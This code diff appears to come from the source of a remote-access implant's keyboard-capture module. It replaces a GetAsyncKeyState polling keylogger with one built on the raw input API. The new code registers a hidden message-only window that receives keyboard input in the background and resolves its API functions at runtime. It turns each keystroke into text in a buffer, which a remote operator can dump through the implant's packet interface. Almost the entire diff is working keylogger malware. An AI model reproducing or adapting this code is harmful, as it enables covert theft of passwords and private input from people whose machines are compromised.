@@ -1,8 +1,13 @@
 #include "precomp.h"
-
+#include "raw.h"
 #include <tchar.h>
 
 extern HMODULE hookLibrary;
+extern HINSTANCE hAppInstance;
+
+LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
+int ui_log_key(UINT vKey);
+int ui_resolve_raw_api();
 
 /*
  * Enables or disables keyboard input
@@ -40,73 +45,141 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 typedef enum { false=0, true=1 } bool;
 
 bool boom[1024];
-
+const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
-char *KeyScanBuff = NULL;
-int KeyScanSize = 1024*1024;
-int KeyScanIndex = 0;
+char *key_scan_buf = NULL;
+unsigned int keyscan_size = 1024*1024;
+unsigned int g_ksindex = 0;
 
-void ui_keyscan_now(bool listStates[2][256], bool *iToggle) {
-    unsigned int iKey = 0;
-
-	TCHAR strLog[8] = {0};
-    for (iKey = 0; iKey < 255; ++iKey)
-    {
-		bool bPrior, bState;
-		DWORD tog = *iToggle;
-        SHORT iState = GetAsyncKeyState(iKey);
-        listStates[tog][iKey] = iState < 0;
-		bPrior = listStates[!tog][iKey];
-        bState = listStates[tog][iKey];
-
-        // detect state change
-        if (bPrior ^ bState && bState == 1)
-        {
-			unsigned char flags = (1<<0);
-
-			TCHAR toHex[] = _T("0123456789ABCDEF");
-            bool bShift = listStates[tog][VK_SHIFT];
-            bool bCtrl = listStates[tog][VK_CONTROL];
-            bool bAlt = listStates[tog][VK_MENU];
 /*
-			strLog[0] = bShift ? 'S' : 's';
-			strLog[1] = bCtrl  ? 'C' : 'c';
-			strLog[2] = bAlt   ? 'A' : 'a';
-			strLog[3] = toHex[(iKey >> 4) & 0xF];
-			strLog[4] = toHex[(iKey & 0xF)];
-			strLog[5] = ';';
-			strLog[6] = '\r';
-			strLog[6] = '\n';
-			OutputDebugString(strLog);
-*/
-			if(bShift) flags |= (1<<1);
-			if(bCtrl)  flags |= (1<<2);
-			if(bAlt)   flags |= (1<<3);
+ * function pointers for the raw input api
+ */
 
-			if(KeyScanIndex >= KeyScanSize) KeyScanIndex = 0;
-			KeyScanBuff[KeyScanIndex+0] = flags;
-			KeyScanBuff[KeyScanIndex+1] = iKey;
-			KeyScanIndex += 2;
-        }
+f_GetRawInputData fnGetRawInputData;
+f_RegisterRawInputDevices fnRegisterRawInputDevices;
+
+/*
+ *  key logger updates begin here
+ */
+
+int WINAPI ui_keyscan_proc()
+{
+WNDCLASSEX klwc;
+    HWND hwnd;
+    MSG msg;
+    int ret = 0;
+
+    if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
+    {
+      ret = ui_resolve_raw_api();
+      if (ret != 1)		 // resolving functions failed
+      {
+        return 0;
+      }
     }
-    *iToggle = !*iToggle;
+
+    // register window class
+    ZeroMemory(&klwc, sizeof(WNDCLASSEX));
+    klwc.cbSize        = sizeof(WNDCLASSEX);
+    klwc.lpfnWndProc   = ui_keyscan_wndproc;
+    klwc.hInstance     = hAppInstance;
+    klwc.lpszClassName = g_szClassName;
+    
+    if(!RegisterClassEx(&klwc))
+    {
+        return 0;
+    }
+    
+    // initialize key_scan_buf
+    if(key_scan_buf) {
+        free(key_scan_buf);
+        key_scan_buf = NULL;
+    }
+
+    key_scan_buf = calloc(keyscan_size, sizeof(char));
+
+    // create message-only window
+    hwnd = CreateWindowEx(
+        0,
+        g_szClassName,
+        NULL,
+        0,
+        0, 0, 0, 0,
+        HWND_MESSAGE, NULL, hAppInstance, NULL
+    );
+
+    if(!hwnd)
+    {
+        return 0;
+    }
+    
+    // message loop
+    while(GetMessage(&msg, NULL, 0, 0) > 0)
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    return msg.wParam;
 }
 
-void ui_keyscan_proc(void) {
-    bool iToggle = false;
-    bool listStates[2][256] = {0};
-
-	if(KeyScanBuff) {
-		free(KeyScanBuff);
-		KeyScanBuff = NULL;
-		KeyScanIndex = 0;
-	}
-
-	KeyScanBuff = calloc(KeyScanSize, sizeof(char));
-	while(1) {
-		ui_keyscan_now(listStates, &iToggle);
-		Sleep(30);
-	}
+LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    UINT dwSize;
+    RAWINPUTDEVICE rid;
+    RAWINPUT *buffer;
+    
+    switch(msg)
+    {
+        // register raw input device
+        case WM_CREATE:
+            rid.usUsagePage = 0x01;
+            rid.usUsage = 0x06;
+            rid.dwFlags = RIDEV_INPUTSINK;
+            rid.hwndTarget = hwnd;
+            
+            if(!fnRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
+            {
+                return -1;
+            }
+            
+        case WM_INPUT:
+            // request size of the raw input buffer to dwSize
+            fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
+                sizeof(RAWINPUTHEADER));
+        
+            // allocate buffer for input data
+            buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
+        
+            if(fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
+                sizeof(RAWINPUTHEADER)))
+            {
+                // if this is keyboard message and WM_KEYDOWN, log the key
+                if(buffer->header.dwType == RIM_TYPEKEYBOARD
+                    && buffer->data.keyboard.Message == WM_KEYDOWN)
+                {
+					// reset array index to 0 if its approaching the upper limit
+					if (g_ksindex >= keyscan_size - 32)
+					{
+						g_ksindex = 0;
+					}
+                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
+                        DestroyWindow(hwnd);
+                }
+            }
+        
+            // free the buffer
+            HeapFree(GetProcessHeap(), 0, buffer);
+            break;
+            
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            break;
+            
+        default:
+            return DefWindowProc(hwnd, msg, wParam, lParam);
+    }
+    return 0;
 }
 
 /*
@@ -122,7 +195,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 	} else {
 		// Make sure we have access to the input desktop
 		if(GetAsyncKeyState(0x0a) == 0) {
-			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keyscan_proc, NULL, 0, NULL);
+			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
 		} else {
 			// No permission to read key state from active desktop
 			result = 5;
@@ -141,7 +214,8 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 {
 	Packet *response = packet_create_response(request);
 	DWORD result = ERROR_SUCCESS;
-	
+	g_ksindex = 0;
+
 	if(tKeyScan) {
 		TerminateThread(tKeyScan, 0);
 		tKeyScan = NULL;
@@ -164,9 +238,9 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	
 	if(tKeyScan) {
 		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
-		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, KeyScanBuff);
-		memset(KeyScanBuff, 0, KeyScanSize);
-		KeyScanIndex = 0;
+		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, key_scan_buf);
+		memset(key_scan_buf, 0, keyscan_size);
+		g_ksindex = 0;
 	} else {
 		result = 1;
 	}
@@ -174,4 +248,75 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	// Transmit the response
 	packet_transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
+}
+
+/*
+ * log keystrokes
+ */
+
+int ui_log_key(UINT vKey)
+{
+    BYTE lpKeyboard[256];
+    char szKey[32];
+    WORD wKey;
+
+    GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
+    GetKeyboardState(lpKeyboard);
+    
+    switch(vKey)
+    {
+        case VK_BACK:
+            g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<^H>");
+            break;
+        case VK_RETURN:
+            g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<CR>\r\n");
+            break;
+        case VK_SHIFT:
+            break;
+		case VK_LCONTROL:
+			g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<Ctrl>");
+			break;
+		case VK_MENU:
+			g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<Alt>");
+			break;
+        default:
+            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1) {
+                g_ksindex += wsprintf(key_scan_buf + g_ksindex, "%c", (char)wKey);
+            }
+            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0) {
+                g_ksindex += wsprintf(key_scan_buf + g_ksindex, "<%s>", szKey);
+            }
+            break;
+    }
+    return 0;
+}
+
+/*
+ * resolve the required functions from the raw input api 
+ */
+
+int ui_resolve_raw_api()
+{
+  HINSTANCE hu32 = LoadLibrary("user32.dll");
+
+  if (hu32 == NULL)
+  {
+    return 0;
+  }
+
+  fnGetRawInputData = (f_GetRawInputData)GetProcAddress(hu32, "GetRawInputData");
+  if (fnGetRawInputData == NULL)
+  {
+    FreeLibrary(hu32);
+    return 0;
+  }
+
+  fnRegisterRawInputDevices = (f_RegisterRawInputDevices)GetProcAddress(hu32, "RegisterRawInputDevices");
+  if (fnRegisterRawInputDevices == NULL)
+  {
+    FreeLibrary(hu32);
+    return 0;
+  }
+  
+  return 1;
 }
